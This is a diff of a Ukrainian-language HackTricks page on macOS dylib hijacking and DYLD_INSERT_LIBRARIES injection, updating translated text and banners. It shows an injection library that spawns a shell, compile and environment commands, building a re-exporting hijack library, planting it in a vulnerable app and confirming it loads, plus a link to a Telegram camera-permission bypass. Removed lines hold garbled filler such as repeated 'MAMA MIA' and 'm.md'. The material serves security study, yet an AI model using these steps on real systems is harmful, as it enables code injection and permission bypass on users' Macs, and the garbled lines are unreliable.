@@ -1,22 +1,23 @@
-# macOS Дикий захоплення та DYLD\_INSERT\_LIBRARIES
+# macOS Dyld Hijacking & DYLD\_INSERT\_LIBRARIES
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Інші способи підтримки HackTricks:
-
-* Якщо ви хочете побачити вашу **компанію рекламовану на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
-* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
-* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **і** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв на GitHub**.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-## Базовий приклад DYLD\_INSERT\_LIBRARIES
+## DYLD\_INSERT\_LIBRARIES Основний приклад
 
-**Бібліотека для впровадження** для виконання оболонки:
+**Бібліотека для ін'єкції** для виконання оболонки:
 ```c
 // gcc -dynamiclib -o inject.dylib inject.c
 
@@ -49,7 +50,7 @@ return 0;
 ```bash
 DYLD_INSERT_LIBRARIES=inject.dylib ./hello
 ```
-## Приклад Викрадення Dyld
+## Dyld Hijacking Example
 
 Цільовий вразливий бінарний файл - `/Applications/VulnDyld.app/Contents/Resources/lib/binary`.
 
@@ -91,7 +92,7 @@ compatibility version 1.0.0
 {% endtab %}
 {% endtabs %}
 
-З попередньою інформацією ми знаємо, що він **не перевіряє підпис завантажених бібліотек** і **намагається завантажити бібліотеку з**:
+З попередньої інформації ми знаємо, що **не перевіряється підпис завантажених бібліотек** і **система намагається завантажити бібліотеку з**:
 
 * `/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib`
 * `/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib`
@@ -104,7 +105,7 @@ pwd
 find ./ -name lib.dylib
 ./Contents/Resources/lib2/lib.dylib
 ```
-Отже, це можливо взламати! Створіть бібліотеку, яка **виконує деякий довільний код та експортує ті ж функціональні можливості**, що й легітимна бібліотека, експортуючи її знову. І не забудьте скомпілювати її з очікуваними версіями:
+Отже, це можливо вкрасти! Створіть бібліотеку, яка **виконує деякий довільний код і експортує ті ж функціональні можливості**, що й легітимна бібліотека, повторно експортувавши її. І не забудьте скомпілювати її з очікуваними версіями:
 
 {% code title="lib.m" %}
 ```objectivec
@@ -117,14 +118,18 @@ NSLog(@"[+] dylib hijacked in %s", argv[0]);
 ```
 {% endcode %}
 
-Скомпілюйте це: 
+Скомпілюйте це:
 
 {% code overflow="wrap" %}
 ```bash
 gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation /tmp/lib.m -Wl,-reexport_library,"/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" -o "/tmp/lib.dylib"
 # Note the versions and the reexport
 ```
-Шлях переекспорту, створений у бібліотеці, є відносним до завантажувача, змінимо його на абсолютний шлях до бібліотеки для експорту:
+{% endcode %}
+
+Шлях повторного експорту, створений у бібліотеці, є відносним до завантажувача, давайте змінимо його на абсолютний шлях до бібліотеки для експорту:
+
+{% code overflow="wrap" %}
 ```bash
 #Check relative
 otool -l /tmp/lib.dylib| grep REEXPORT -A 2
@@ -143,34 +148,42 @@ name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Con
 ```
 {% endcode %}
 
-Наостанок, просто скопіюйте його до **захопленого місця**:
+Нарешті просто скопіюйте це до **викраденого місця**:
 
 {% code overflow="wrap" %}
 ```bash
 cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
 ```
-and M_m m.md m.md m.md M of markdown e in m.md m.md m.md m.md m.md m.md m  M on m  markdown e in M; M and m markdown
+{% endcode %}
 
- m ceiling. M.m and on.meM markdown.m m markdown m markdown
+І **виконайте** двійковий файл і перевірте, чи **бібліотека була завантажена**:
 
- m ceiling. M.m and on.meM markdown.meM markdown.m m markdown m ceiling. M.m and on.meM markdown.m m markdown.m m markdown
+<pre class="language-context"><code class="lang-context">"/Applications/VulnDyld.app/Contents/Resources/lib/binary"
+<strong>2023-05-15 15:20:36.677 binary[78809:21797902] [+] dylib hijacked in /Applications/VulnDyld.app/Contents/Resources/lib/binary
+</strong>Використання: [...]
+</code></pre>
 
- markdown, directory.md m m
+{% hint style="info" %}
+Гарний опис того, як зловживати цією вразливістю для зловживання дозволами камери Telegram, можна знайти за посиланням [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
+{% endhint %}
 
-## MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA MAMA MIA m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m
+## Більший масштаб
+
+Якщо ви плануєте спробувати впроваджувати бібліотеки в несподівані двійкові файли, ви можете перевірити повідомлення подій, щоб дізнатися, коли бібліотека завантажується всередині процесу (в цьому випадку видаліть printf і виконання `/bin/bash`).
 ```bash
 sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
 ```
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Підтримати HackTricks</summary>
 
-Інші способи підтримки HackTricks:
-
-* Якщо ви хочете побачити свою **компанію рекламовану на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
-* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
-* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.
+* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на github.
 
 </details>
+{% endhint %}
